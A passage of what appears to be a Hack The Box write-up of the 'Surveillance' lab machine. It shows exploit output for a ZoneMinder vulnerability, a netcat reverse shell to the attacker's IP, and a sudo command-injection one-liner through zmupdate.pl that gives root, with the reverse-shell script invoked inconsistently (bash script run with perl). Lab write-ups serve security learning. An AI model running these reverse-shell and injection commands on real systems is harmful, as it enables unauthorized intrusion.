+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> recieved the token: key:845fd9dea6ae5ab19dc10adb01f9fb99b27e321c,1708598433 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> executing... 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> sending payload.. 
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>dexter@lab:~/lab/HTB/machines/surveilance/CVE-2023-26035$ nc -lnvp <span style="color:#ae81ff">4444</span>    
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ... 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.35<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.11.245<span style="color:#f92672">]</span> <span style="color:#ae81ff">40688</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>1111<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>bash: no job control in this shell 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>zoneminder@surveillance:/usr/share/zoneminder/www$  
+</span></span></code></pre></div><p>We can get into the machine and now we can try and see what zoneminder can do, for example what zoneminder can run as sudo, since we remember matthew could not run any commands as sudo.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>zoneminder@surveillance:~$ sudo -l  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sudo -l  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> zoneminder on surveillance: 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin, 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    use_pty 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User zoneminder may run the following commands on surveillance: 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL : ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/zm<span style="color:#f92672">[</span>a-zA-Z<span style="color:#f92672">]</span>*.pl * 
+</span></span></code></pre></div><p>The sudoers entry allows the zoneminder user to run any file in the /usr/bin directory that starts with zm, proceeded by only uppercase or lowercase letters and ends in a .pl extension. The second wild card allows anything to be run after it.
+<img src="https://i.ibb.co/wSfrLPZ/some-png.webp" alt="vuln">
+The vulnerability appears to stem from improper input validation or insecure handling of user-supplied input in the zmupdate.pl script. By providing a file directory instead of a valid user parameter, we may be able to inject arbitrary commands into the script&rsquo;s execution flow.</p>
+<p>We can craft a malicious request to the zmupdate.pl script, supplying a file directory as the user parameter. Along with this, attach the password obtained earlier to authenticate the request, making it appear legitimate. As part of the exploit payload, then we may choose to create a reverse shell script and place it in a writable directory, such as /tmp. A reverse shell script allows us to establish a connection from the compromised system back to our machine, effectively providing remote access to the compromised system&rsquo;s command line.</p>
+<p>We then can send the crafted request to the vulnerable zmupdate.pl script, triggering the execution of arbitrary commands, including the creation and execution of the reverse shell script. Once the reverse shell is established, we gain remote access to the compromised system&rsquo;s command line.</p>
+<p>With a reverse shell established, we can interact with the compromised system, execute additional commands, escalate privileges, exfiltrate data, or perform further malicious activities as desired.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>busybox nc 10.10.14.35 <span style="color:#ae81ff">1234</span> -e sh 
+</span></span></code></pre></div><p>So we need to send the reverse shell onto the target machine and then try and run the zmupdate.pl using a one liner. We are also gonna add the password we found using linpeas earlier.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo /usr/bin/zmupdate.pl --version<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> --user<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$(perl /tmp/revshell.pl)&#39;</span> --pass<span style="color:#f92672">=</span>ZoneMinderPassword 
+</span></span></code></pre></div><p>BusyBox&rsquo;s version of Netcat is often used in scenarios where resources are limited, and a full-featured Netcat installation may not be feasible or necessary.
+<img src="https://i.ibb.co/2hKRKNb/updating-zoneminder.png" alt="updating"></p>
+<p>and we are root.</p>
+<p><img src="https://i.ibb.co/QPG5495/root.png" alt="root"></p>
+</div>
+				
+				<footer class="entry__footer">
+					
+<div class="entry__tags">
+			<a class="entry__tag btn" href="/tags/privesc/">Privesc</a>
+			<a class="entry__tag btn" href="/tags/boot2root/">Boot2root</a>
+</div>
+					
+<div class="entry__share share">
+	<a class="share__link btn" title="Share on Twitter" href="https://twitter.com/intent/tweet/?url=%2f%2flocalhost%3a1313%2fposts%2fhtb%2fsurveillance%2f&amp;text=Surveillance" target="_blank" rel="noopener noreferrer" onclick="window.open(this.href, 'Share on Twitter', 'width=800,height=450,resizable=yes,toolbar=0,status=0'); return false">
+		<svg class="share__icon" aria-label="Twitter" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M437 152a72 72 0 0 1-40 12 72 72 0 0 0 32-40 72 72 0 0 1-45 17 72 72 0 0 0-122 65 200 200 0 0 1-145-74 72 72 0 0 0 22 94 72 72 0 0 1-32-7 72 72 0 0 0 56 69 72 72 0 0 1-32 1 72 72 0 0 0 67 50 200 200 0 0 1-105 29 200 200 0 0 0 309-179 200 200 0 0 0 35-37"/></svg>
+	</a>
+	<a class="share__link btn" title="Share on LinkedIn" href="https://www.linkedin.com/shareArticle?mini=true&url=%2f%2flocalhost%3a1313%2fposts%2fhtb%2fsurveillance%2f&title=Surveillance" target="_blank" rel="noopener noreferrer" onclick="window.open(this.href, 'Share on LinkedIn', 'width=640,height=480,toolbar=0,status=0'); return false">
+		<svg class="share__icon" aria-label="LinkedIn" role="img" width="32" height="32" viewBox="0 0 512 512"><circle cx="142" cy="138" r="37"/><path stroke-width="66" d="M244 194v198M142 194v198"/><path d="M276 282c0-20 13-40 36-40 24 0 33 18 33 45v105h66V279c0-61-32-89-76-89-34 0-51 19-59 32"/></svg>
+	</a>
+</div>
+				</footer>
+				
+			</article>
+		</div>
+	</main>
+	
+<div class="authorbox block">
+	<div class="author">
+		<div class="author__body">
+			<div class="author__name">
+				Dexter
+			</div>
+			<div class="author__bio">Just human</div>
+		</div>
+	</div>
+</div>
+	
+
+
+
+<div class="related block">
+	<h3 class="related__title">Related</h3>
+	<ul class="related__list">
+		
+		<li class="related__item"><a class="related__link" href="/posts/thm/alice/">Alice in Wonderland</a></li>
+		
+		<li class="related__item"><a class="related__link" href="/posts/thm/archangel/">Archangel</a></li>
+		
+		<li class="related__item"><a class="related__link" href="/posts/thm/bountyhacker/">Bounty Hacker</a></li>
+		
+		<li class="related__item"><a class="related__link" href="/posts/thm/dogcat/">DogCat</a></li>
+		
+	</ul>
+</div>
+
+	
+
+	</div>
+	<footer class="footer">
+<div class="footer__social social">
+		<a class="social__link" target="_blank" rel="noopener noreferrer" href="mailto:dexter7isme@gmail.com">
+			<svg class="social__icon" aria-label="Email" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M299 268l124 106c-4 4-10 7-17 7H106c-7 0-13-3-17-7l124-106 43 38 43-38zm-43 13L89 138c4-4 10-7 17-7h300c7 0 13 3 17 7L256 281zm54-23l121-105v208L310 258zM81 153l121 105L81 361V153z"/></svg>
+		</a>
+		<a class="social__link" target="_blank" rel="noopener noreferrer" href="https://github.com/w-47">
+			<svg class="social__icon" aria-label="Github" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M335 499c14 0 12 17 12 17H165s-2-17 12-17c13 0 16-6 16-12l-1-50c-71 16-86-28-86-28-12-30-28-37-28-37-24-16 1-16 1-16 26 2 40 26 40 26 22 39 59 28 74 22 2-17 9-28 16-35-57-6-116-28-116-126 0-28 10-51 26-69-3-6-11-32 3-67 0 0 21-7 70 26 42-12 86-12 128 0 49-33 70-26 70-26 14 35 6 61 3 67 16 18 26 41 26 69 0 98-60 120-117 126 10 8 18 24 18 48l-1 70c0 6 3 12 16 12z"/></svg>
+		</a>
+</div>
+	<div class="footer__copyright">© 2025 Dexter. <span class="footer__copyright-credits">Powered by <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/vimux/binario" rel="nofollow noopener" target="_blank">Binario</a> theme.</span></div>
+</footer>
+</body>
+</html>
